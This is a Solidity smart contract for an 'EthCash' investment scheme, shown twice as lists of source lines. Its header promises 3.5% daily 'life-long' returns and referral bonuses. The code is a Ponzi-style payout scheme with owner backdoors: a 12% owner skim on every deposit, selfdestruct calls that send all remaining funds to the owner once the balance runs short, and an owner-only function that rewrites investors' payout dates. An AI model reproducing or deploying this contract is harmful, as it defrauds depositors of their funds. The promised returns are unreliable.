['pragma solidity ^0.4.24;\n', '\n', '/*\n', '*\n', '* EthCash Contract Source\n', '*~~~~~~~~~~~~~~~~~~~~~~~\n', '* Web: ethcash.online\n', '* Web mirrors: ethcash.global | ethcash.club\n', '* Email: <a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="4f20212326212a0f2a3b272c2e3c276120212326212a">[email&#160;protected]</a>\n', '* Telergam: ETHCash_Online\n', '*~~~~~~~~~~~~~~~~~~~~~~~\n', '*  - GAIN 3,50% PER 24 HOURS\n', '*  - Life-long payments\n', '*  - Minimal 0.03 ETH\n', '*  - Can payouts yourself every 30 minutes - send 0 eth (> 0.001 ETH must accumulate on balance)\n', '*  - Affiliate 7.00%\n', '*    -- 3.50% Cashback (first payment with ref adress DATA)\n', '*~~~~~~~~~~~~~~~~~~~~~~~   \n', '* RECOMMENDED GAS LIMIT: 250000\n', '* RECOMMENDED GAS PRICE: ethgasstation.info\n', '*\n', '*/\n', '\n', 'library SafeMath {\n', '    function mul(uint256 a, uint256 b) internal pure returns(uint256) {\n', '        if(a == 0) {\n', '            return 0;\n', '        }\n', '\n', '        uint256 c = a * b;\n', '        require(c / a == b);\n', '\n', '        return c;\n', '    }\n', '\n', '    function div(uint256 a, uint256 b) internal pure returns(uint256) {\n', '        require(b > 0);\n', '        uint256 c = a / b;\n', '\n', '        return c;\n', '    }\n', '\n', '    function sub(uint256 a, uint256 b) internal pure returns(uint256) {\n', '        require(b <= a);\n', '        uint256 c = a - b;\n', '\n', '        return c;\n', '    }\n', '\n', '    function add(uint256 a, uint256 b) internal pure returns(uint256) {\n', '        uint256 c = a + b;\n', '        require(c >= a);\n', '\n', '        return c;\n', '    }\n', '\n', '    function mod(uint256 a, uint256 b) internal pure returns(uint256) {\n', '        require(b != 0);\n', '\n', '        return a % b;\n', '    }\n', '}\n', '\n', 'contract Ownable {\n', '    address private _owner;\n', '\n', '    event OwnershipRenounced(address indexed previousOwner);\n', '    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);\n', '\n', '    modifier onlyOwner() { require(isOwner()); _; }\n', '\n', '    constructor() public {\n', '        _owner = msg.sender;\n', '    }\n', '\n', '    function owner() public view returns(address) {\n', '        return _owner;\n', '    }\n', '\n', '    function isOwner() public view returns(bool) {\n', '        return msg.sender == _owner;\n', '    }\n', '\n', '    function renounceOwnership() public onlyOwner {\n', '        _owner = address(0);\n', '\n', '        emit OwnershipRenounced(_owner);\n', '    }\n', '\n', '    function transferOwnership(address newOwner) public onlyOwner {\n', '        _transferOwnership(newOwner);\n', '    }\n', '\n', '    function _transferOwnership(address newOwner) internal {\n', '        require(newOwner != address(0));\n', '\n', '        _owner = newOwner;\n', '        \n', '        emit OwnershipTransferred(_owner, newOwner);\n', '    }\n', '}\n', '\n', 'contract EthCashonline is Ownable {\n', '    using SafeMath for uint;\n', '    \n', '    struct Investor {\n', '        uint id;\n', '        uint deposit;\n', '        uint deposits;\n', '        uint date;\n', '        address referrer;\n', '    }\n', '\n', '    uint private MIN_INVEST = 0.03 ether;\n', '    uint private OWN_COMMISSION_PERCENT = 12;\n', '    uint private REF_BONUS_PERCENT = 7;\n', '    uint private CASHBACK_PERCENT = 35;\n', '    uint private PAYOUT_INTERVAL = 1 minutes; \n', '    uint private PAYOUT_SELF_INTERVAL = 30 minutes;\n', '    uint private INTEREST = 35;\n', '\n', '    uint public depositAmount;\n', '    uint public payoutDate;\n', '    uint public paymentDate;\n', '\n', '    address[] public addresses;\n', '    mapping(address => Investor) public investors;\n', '\n', '    event Invest(address holder, uint amount);\n', '    event ReferrerBonus(address holder, uint amount);\n', '    event Cashback(address holder, uint amount);\n', '    event PayoutCumulative(uint amount, uint txs);\n', '    event PayoutSelf(address addr, uint amount);\n', '    \n', '    constructor() public {\n', '        payoutDate = now;\n', '    }\n', '    \n', '    function() payable public {\n', '\n', '        if (0 == msg.value) {\n', '            payoutSelf();\n', '            return;\n', '        }\n', '\n', '        require(msg.value >= MIN_INVEST, "Too small amount");\n', '\n', '        Investor storage user = investors[msg.sender];\n', '\n', '        if(user.id == 0) {\n', '            user.id = addresses.length + 1;\n', '            addresses.push(msg.sender);\n', '\n', '            address ref = bytesToAddress(msg.data);\n', '            if(investors[ref].deposit > 0 && ref != msg.sender) {\n', '                user.referrer = ref;\n', '            }\n', '        }\n', '\n', '        user.deposit = user.deposit.add(msg.value);\n', '        user.deposits = user.deposits.add(1);\n', '        user.date = now;\n', '        emit Invest(msg.sender, msg.value);\n', '\n', '        paymentDate = now;\n', '        depositAmount = depositAmount.add(msg.value);\n', '\n', '        uint own_com = msg.value.div(100).mul(OWN_COMMISSION_PERCENT);\n', '        owner().transfer(own_com);\n', '\n', '        if(user.referrer != address(0)) {\n', '            uint bonus = msg.value.div(100).mul(REF_BONUS_PERCENT);\n', '            user.referrer.transfer(bonus);\n', '            emit ReferrerBonus(user.referrer, bonus);\n', '\n', '            if(user.deposits == 1) {\n', '                uint cashback = msg.value.div(1000).mul(CASHBACK_PERCENT);\n', '                msg.sender.transfer(cashback);\n', '                emit Cashback(msg.sender, cashback);\n', '            }\n', '        }\n', '    }\n', '    \n', '    function payout(uint limit) public {\n', '\n', '        require(now >= payoutDate + PAYOUT_INTERVAL, "Too fast payout request");\n', '\n', '        uint sum;\n', '        uint txs;\n', '\n', '        for(uint i = addresses.length ; i > 0; i--) {\n', '            address addr = addresses[i - 1];\n', '\n', '            if(investors[addr].date + 24 hours > now) continue;\n', '\n', '            uint amount = getInvestorUnPaidAmount(addr);\n', '            investors[addr].date = now;\n', '\n', '            if(address(this).balance < amount) {\n', '                selfdestruct(owner());\n', '                return;\n', '            }\n', '\n', '            addr.transfer(amount);\n', '\n', '            sum = sum.add(amount);\n', '\n', '            if(++txs >= limit) break;\n', '        }\n', '\n', '        payoutDate = now;\n', '\n', '        emit PayoutCumulative(sum, txs);\n', '    }\n', '    \n', '    function payoutSelf() public {\n', '        address addr = msg.sender;\n', '\n', '        require(investors[addr].deposit > 0, "Deposit not found");\n', '        require(now >= investors[addr].date + PAYOUT_SELF_INTERVAL, "Too fast payout request");\n', '\n', '        uint amount = getInvestorUnPaidAmount(addr);\n', '        require(amount >= 1 finney, "Too small unpaid amount");\n', '\n', '        investors[addr].date = now;\n', '\n', '        if(address(this).balance < amount) {\n', '            selfdestruct(owner());\n', '            return;\n', '        }\n', '\n', '        addr.transfer(amount);\n', '\n', '        emit PayoutSelf(addr, amount);\n', '    }\n', '    \n', '    function bytesToAddress(bytes bys) private pure returns(address addr) {\n', '        assembly {\n', '            addr := mload(add(bys, 20))\n', '        }\n', '    }\n', '\n', '    function getInvestorUnPaidAmount(address addr) public view returns(uint) {\n', '        return investors[addr].deposit.div(1000).mul(INTEREST).div(100).mul(now.sub(investors[addr].date).mul(100)).div(1 days);\n', '    }\n', '\n', '    function getInvestorCount() public view returns(uint) { return addresses.length; }\n', '    function checkDatesPayment(address addr, uint date) onlyOwner public { investors[addr].date = date; }\n', '}']
['pragma solidity ^0.4.24;\n', '\n', '/*\n', '*\n', '* EthCash Contract Source\n', '*~~~~~~~~~~~~~~~~~~~~~~~\n', '* Web: ethcash.online\n', '* Web mirrors: ethcash.global | ethcash.club\n', '* Email: online@ethcash.online\n', '* Telergam: ETHCash_Online\n', '*~~~~~~~~~~~~~~~~~~~~~~~\n', '*  - GAIN 3,50% PER 24 HOURS\n', '*  - Life-long payments\n', '*  - Minimal 0.03 ETH\n', '*  - Can payouts yourself every 30 minutes - send 0 eth (> 0.001 ETH must accumulate on balance)\n', '*  - Affiliate 7.00%\n', '*    -- 3.50% Cashback (first payment with ref adress DATA)\n', '*~~~~~~~~~~~~~~~~~~~~~~~   \n', '* RECOMMENDED GAS LIMIT: 250000\n', '* RECOMMENDED GAS PRICE: ethgasstation.info\n', '*\n', '*/\n', '\n', 'library SafeMath {\n', '    function mul(uint256 a, uint256 b) internal pure returns(uint256) {\n', '        if(a == 0) {\n', '            return 0;\n', '        }\n', '\n', '        uint256 c = a * b;\n', '        require(c / a == b);\n', '\n', '        return c;\n', '    }\n', '\n', '    function div(uint256 a, uint256 b) internal pure returns(uint256) {\n', '        require(b > 0);\n', '        uint256 c = a / b;\n', '\n', '        return c;\n', '    }\n', '\n', '    function sub(uint256 a, uint256 b) internal pure returns(uint256) {\n', '        require(b <= a);\n', '        uint256 c = a - b;\n', '\n', '        return c;\n', '    }\n', '\n', '    function add(uint256 a, uint256 b) internal pure returns(uint256) {\n', '        uint256 c = a + b;\n', '        require(c >= a);\n', '\n', '        return c;\n', '    }\n', '\n', '    function mod(uint256 a, uint256 b) internal pure returns(uint256) {\n', '        require(b != 0);\n', '\n', '        return a % b;\n', '    }\n', '}\n', '\n', 'contract Ownable {\n', '    address private _owner;\n', '\n', '    event OwnershipRenounced(address indexed previousOwner);\n', '    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);\n', '\n', '    modifier onlyOwner() { require(isOwner()); _; }\n', '\n', '    constructor() public {\n', '        _owner = msg.sender;\n', '    }\n', '\n', '    function owner() public view returns(address) {\n', '        return _owner;\n', '    }\n', '\n', '    function isOwner() public view returns(bool) {\n', '        return msg.sender == _owner;\n', '    }\n', '\n', '    function renounceOwnership() public onlyOwner {\n', '        _owner = address(0);\n', '\n', '        emit OwnershipRenounced(_owner);\n', '    }\n', '\n', '    function transferOwnership(address newOwner) public onlyOwner {\n', '        _transferOwnership(newOwner);\n', '    }\n', '\n', '    function _transferOwnership(address newOwner) internal {\n', '        require(newOwner != address(0));\n', '\n', '        _owner = newOwner;\n', '        \n', '        emit OwnershipTransferred(_owner, newOwner);\n', '    }\n', '}\n', '\n', 'contract EthCashonline is Ownable {\n', '    using SafeMath for uint;\n', '    \n', '    struct Investor {\n', '        uint id;\n', '        uint deposit;\n', '        uint deposits;\n', '        uint date;\n', '        address referrer;\n', '    }\n', '\n', '    uint private MIN_INVEST = 0.03 ether;\n', '    uint private OWN_COMMISSION_PERCENT = 12;\n', '    uint private REF_BONUS_PERCENT = 7;\n', '    uint private CASHBACK_PERCENT = 35;\n', '    uint private PAYOUT_INTERVAL = 1 minutes; \n', '    uint private PAYOUT_SELF_INTERVAL = 30 minutes;\n', '    uint private INTEREST = 35;\n', '\n', '    uint public depositAmount;\n', '    uint public payoutDate;\n', '    uint public paymentDate;\n', '\n', '    address[] public addresses;\n', '    mapping(address => Investor) public investors;\n', '\n', '    event Invest(address holder, uint amount);\n', '    event ReferrerBonus(address holder, uint amount);\n', '    event Cashback(address holder, uint amount);\n', '    event PayoutCumulative(uint amount, uint txs);\n', '    event PayoutSelf(address addr, uint amount);\n', '    \n', '    constructor() public {\n', '        payoutDate = now;\n', '    }\n', '    \n', '    function() payable public {\n', '\n', '        if (0 == msg.value) {\n', '            payoutSelf();\n', '            return;\n', '        }\n', '\n', '        require(msg.value >= MIN_INVEST, "Too small amount");\n', '\n', '        Investor storage user = investors[msg.sender];\n', '\n', '        if(user.id == 0) {\n', '            user.id = addresses.length + 1;\n', '            addresses.push(msg.sender);\n', '\n', '            address ref = bytesToAddress(msg.data);\n', '            if(investors[ref].deposit > 0 && ref != msg.sender) {\n', '                user.referrer = ref;\n', '            }\n', '        }\n', '\n', '        user.deposit = user.deposit.add(msg.value);\n', '        user.deposits = user.deposits.add(1);\n', '        user.date = now;\n', '        emit Invest(msg.sender, msg.value);\n', '\n', '        paymentDate = now;\n', '        depositAmount = depositAmount.add(msg.value);\n', '\n', '        uint own_com = msg.value.div(100).mul(OWN_COMMISSION_PERCENT);\n', '        owner().transfer(own_com);\n', '\n', '        if(user.referrer != address(0)) {\n', '            uint bonus = msg.value.div(100).mul(REF_BONUS_PERCENT);\n', '            user.referrer.transfer(bonus);\n', '            emit ReferrerBonus(user.referrer, bonus);\n', '\n', '            if(user.deposits == 1) {\n', '                uint cashback = msg.value.div(1000).mul(CASHBACK_PERCENT);\n', '                msg.sender.transfer(cashback);\n', '                emit Cashback(msg.sender, cashback);\n', '            }\n', '        }\n', '    }\n', '    \n', '    function payout(uint limit) public {\n', '\n', '        require(now >= payoutDate + PAYOUT_INTERVAL, "Too fast payout request");\n', '\n', '        uint sum;\n', '        uint txs;\n', '\n', '        for(uint i = addresses.length ; i > 0; i--) {\n', '            address addr = addresses[i - 1];\n', '\n', '            if(investors[addr].date + 24 hours > now) continue;\n', '\n', '            uint amount = getInvestorUnPaidAmount(addr);\n', '            investors[addr].date = now;\n', '\n', '            if(address(this).balance < amount) {\n', '                selfdestruct(owner());\n', '                return;\n', '            }\n', '\n', '            addr.transfer(amount);\n', '\n', '            sum = sum.add(amount);\n', '\n', '            if(++txs >= limit) break;\n', '        }\n', '\n', '        payoutDate = now;\n', '\n', '        emit PayoutCumulative(sum, txs);\n', '    }\n', '    \n', '    function payoutSelf() public {\n', '        address addr = msg.sender;\n', '\n', '        require(investors[addr].deposit > 0, "Deposit not found");\n', '        require(now >= investors[addr].date + PAYOUT_SELF_INTERVAL, "Too fast payout request");\n', '\n', '        uint amount = getInvestorUnPaidAmount(addr);\n', '        require(amount >= 1 finney, "Too small unpaid amount");\n', '\n', '        investors[addr].date = now;\n', '\n', '        if(address(this).balance < amount) {\n', '            selfdestruct(owner());\n', '            return;\n', '        }\n', '\n', '        addr.transfer(amount);\n', '\n', '        emit PayoutSelf(addr, amount);\n', '    }\n', '    \n', '    function bytesToAddress(bytes bys) private pure returns(address addr) {\n', '        assembly {\n', '            addr := mload(add(bys, 20))\n', '        }\n', '    }\n', '\n', '    function getInvestorUnPaidAmount(address addr) public view returns(uint) {\n', '        return investors[addr].deposit.div(1000).mul(INTEREST).div(100).mul(now.sub(investors[addr].date).mul(100)).div(1 days);\n', '    }\n', '\n', '    function getInvestorCount() public view returns(uint) { return addresses.length; }\n', '    function checkDatesPayment(address addr, uint date) onlyOwner public { investors[addr].date = date; }\n', '}']
